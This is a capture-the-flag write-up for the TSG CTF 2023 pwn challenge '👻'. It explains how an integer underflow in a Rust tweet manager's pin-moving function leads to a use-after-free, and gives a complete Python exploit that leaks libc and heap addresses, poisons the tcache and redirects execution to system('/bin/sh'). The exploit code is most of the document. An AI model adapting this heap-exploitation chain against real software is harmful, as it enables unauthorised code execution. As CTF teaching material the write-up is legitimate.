# TSG CTF 2023 - pwn/👻

## Solution

`2. undo tweet` option allows us to delete the last tweet, but there is a check.
```rust
    pub fn pop<'a>(&'a mut self) {
        if self.inner.len() > self.max_index + 1 {
            self.inner.pop();
        } else {
            panic!("failed to pop")
        }
    }
```
`max_index` is designed to be the largest pinned tweet index up to that point. If we can make the pinned index greater than `max_index`, we can free the pinned tweet.

To achive this, we can input `old_new = 0` and `id = 2**64 - n` as `-n` in `move_pin_tweet` function to increase `self.pinned` while avoiding the call to `get_index`, which updates `max_index`.

```rust
    fn move_pin_tweet(&mut self) {
        print_str("older[0] / newer[1] > ");
        let old_new = get_usize();
        print_str("size > ");
        let id = get_usize();

        if old_new == 1 {
            self.pinned = self
                .tweets
                .get_index(self.pinned + id)
                .expect("no such tweet");
        } else {
            self.pinned = self.pinned - id;
        }
        assert!(self.sanity_check());
    }
```

After freeing the pinned tweet, we can still access it through options `4. print pinned tweet` and `5. modify pinned tweet`.
This binary uses glibc's memory allocator, so the rest of exploitation is roughly the same as *tinyfs*.

## Exploit

```python
def select(n):
    sc.after("> ").sendline(str(n))
def post(data: bytes | str):
    select(1)
    sc.after("tweet >").sendline(data)
def undo():
    select(2)
def pin(id):
    select(3)
    sc.after("id >").sendline(str(id))
def print_pin():
    select(4)
def move_pin(old_new, size):
    select(6)
    sc.after("older[0]").sendline(str(old_new))
    sc.after("size > ").sendline(str(size))
def modify_pin(data):
    select(5)
    sc.after("tweet > ").sendline(data)

# libc leak

s1 = 0x108
for i in range(9):
    post(b"a" * s1)

pin(0)
move_pin(0, 2 ** 64 - 2)

for i in range(8):
    undo()

print_pin()
leak = sc.recv_before("\n>")
leak = util.u2i(leak[:8])

libc_offset = leak - 0x7ffff7e19ce0
libc_base = 0x00007ffff7c00000 + libc_offset

print(f"{libc_base=:#x}")

# heap leak

for i in range(7):
    post(b"a" * s1)

pin(0)
move_pin(0, 2 ** 64 - 8)

for i in range(7):
    undo()

print_pin()

leak = sc.recv_before("\n>")
leak = util.u2i(leak[:8])
mask = leak

# reset

for i in range(7):
    post(b"a" * s1)

pin(0)
move_pin(0, 2 ** 64 - 7)

for i in range(7):
    undo()

print_pin()

leak = sc.recv_before("\n>")
leak = util.u2i(leak[:8])
print(f"{leak ^ mask=:#x}")

# tcache poisoning

target = 0x00007ffff7e19000 + libc_offset

modify_pin(util.u64(target ^ mask))

for i in range(6):
    post(b"a" * s1)

ptrs = [0x30 + i for i in range(s1 // 8)]

ptrs[0x13] = 0x000f2d7a + libc_base
ptrs[0x0c] = 0x00121f5a + libc_base
ptrs[0x18] = 0x00052dd4 + libc_base
ptrs[0x17] = 0x0002a8bb + libc_base
ptrs[0x14] = 0x000de39f + libc_base
ptrs[0x1d] = 0x000c535d + libc_base
ptrs[0x20] = 0x7ffff7c50d70 + libc_offset # system
ptrs[0] = int.from_bytes(b"/bin/sh\0", "little")

post(util.u64(*ptrs))

select(7)

```

## Flag

```
TSGCTF{Ghost_dwells_within_the_proof}
```